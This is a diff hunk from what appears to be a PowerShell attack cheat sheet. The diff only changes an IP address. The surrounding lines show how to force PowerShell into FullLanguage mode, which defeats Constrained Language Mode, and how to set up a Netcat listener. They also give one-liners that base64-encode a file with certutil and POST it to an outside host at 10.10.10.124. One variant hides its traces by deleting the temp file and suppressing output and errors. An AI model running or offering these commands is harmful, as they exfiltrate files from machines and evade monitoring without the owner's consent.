@@ -72,7 +72,7 @@ $ExecutionContext.SessionState.LanguageMode
 $ExecutionContext.SessionState.LanguageMode = 'FullLanguage'     #to change
 ------------------------------------------
 Step 1   # nc -lvnp 80
-Step 1   To test connection> Test-NetConnection -ComputerName 10.90.2.44 -Port 80
+Step 1   To test connection> Test-NetConnection -ComputerName 10.10.10.124 -Port 80
 Step 2   > certutil -encode C:\Windows\System32\drivers\etc\hosts C:\Users\2Pirate\hosts.b64; $b64 = Get-Content -Path 'C:\2Pirate\hosts.b64' -Raw; Invoke-WebRequest -Uri http://10.10.10.124:80/ -Method POST -Body $b64 -ContentType "text/plain" -ErrorAction SilentlyContinue
 Step 2   Alternative   #### Oneliner to Base64 encode file with certutil into TEMP file certcheck.b64 and send to Netcat listener, 2 sec then command stops and dont wait for response also NO OUTPUT.  
 > $TempFile = "$env:TEMP\certcheck.b64"; certutil -encode C:\Windows\System32\drivers\etc\hosts $TempFile | Out-Null; $b64 = Get-Content -Path $TempFile -Raw; Remove-Item -Path $TempFile -Force; try { Invoke-WebRequest -Uri http://10.10.10.124:80/ -Method POST -Body $b64 -ContentType "text/plain" -ErrorAction Stop -TimeoutSec 2 | Out-Null } catch { $null }
